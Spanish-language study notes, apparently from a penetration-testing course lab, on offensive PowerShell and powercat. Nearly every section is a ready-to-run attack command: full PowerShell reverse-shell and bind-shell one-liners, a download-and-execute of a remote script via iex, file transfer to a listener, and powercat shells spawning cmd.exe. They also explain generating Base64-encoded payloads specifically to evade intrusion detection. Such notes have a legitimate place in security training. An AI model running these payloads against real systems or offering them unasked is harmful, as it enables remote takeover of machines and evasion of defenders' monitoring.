# Powershell 
## Para configurar powershell sin restricciones
 lo ejecutamos como administrador y el siguiente comando
```
Set-ExecutionPolicy Unrestricted
```
podemos verificar el cambio realizado con 
```
Get-ExecutionPolicy
```
## Trasnferencia de archivos
Un ejemplo de trasnferencia de archivo
```
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
/10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```
El parametro `-c` nos permitira ejecutar todo lo que este entre comillas dobles.
Con `(new-object System.Net.WebClient)` creamos una instancia de un WebClient.
La funcion `.DownloadFile` tiene 2 parametros, la ruta origen y la ruta destino
## PowerShell Reverse Shell 
Ejecutamos el comando
```
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"
```
Donde especificamos la ip y el puerto de la maquina remota donde queremos conectarnos.
## PowerShell Bind Shells
Ejecutamos el comando 
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
'0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto
p()"
```
## Powecat
Se puede instalar en Kali con 
```
apt install powercat
```
su ruta sera `/usr/share/windows-resources/powercat`

Podemos trasnferir el script a la maquina windows y ejecutar el script
```
 . .\powercat.ps1
```
Si la máquina de destino está conectada a Internet, podemos hacer lo mismo con un script remoto usando una vez más el práctico cmdlet iex de la siguiente manera.
```
iex (New-Object System.Net.Webclient).DownloadString('https://raw.
githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
si lo hacemos de esta manera los script deberan cargarse cada vez que reiniciemos el powershell.
Ahora que el script esta cargado podemos usarlo con 
```
 powercat
```
## Transferencia de archivos con Powercat
La maquina que recibira los archivos se pone a la escucha con netcat 
```
 sudo nc -lnvp 443 > receiving_powercat.ps1
```
Y en la maquina desde la cual se enviara los archivos se ejcuta
```
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```
Especificando la ip y el puerto de la maquina que esta a la escucha, y el archivo que se desea trasnferir
## Powercat reverse shells
Comenzamos con nuestra maquina 
```
sudo nc -lvp 443
```
Y en la otra maquina ejecutamos powercat con la opcion `-e` para especificar que aplicacion queremos que se ejecute una vez realizada la conexion
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```
## Powercat Bind Shell
Ponemos la maquina windows a la escucha con powercat, y especificamos la aplicacion que queremos que se ejecute al realizarse la conexion
```
powercat -l -p 443 -e cmd.exe
```
Y desde nuestra maquina nos conectamos con 
```
nc 10.11.0.22 443
```
## Powercat Stand-Alone Payloads
En powercat un payload es una serie de instrucciones, por ejemplo una vez que se tiene una maquina a la escucha podemos crear un payoad reverseShell
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
```
con el parametro `-g` redirigimos el resultado a un archivo, el cual luego podemos ejecutar ejm:
```
./reverseshell.ps1
```
Un `IDS` puede detectar este tipo de cargas utiles, para intentar superar este problema podemos usar comando codificados en `Base64` usando el parametro `ge`
```
 powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.
ps1
```
El archivo contendra una cadena de caracteres codificiados, y para poder ejecutarlo debemos usar el parametro -E, pero especificando el contenido codificado ejemplo:
```
 powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM
AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzA
CkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQB
yAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAb
wBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAo
AIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByA
HMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIAB
OAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAc
ABDAGwAaQBlAG4AdAAKACAAIAAgACA
```
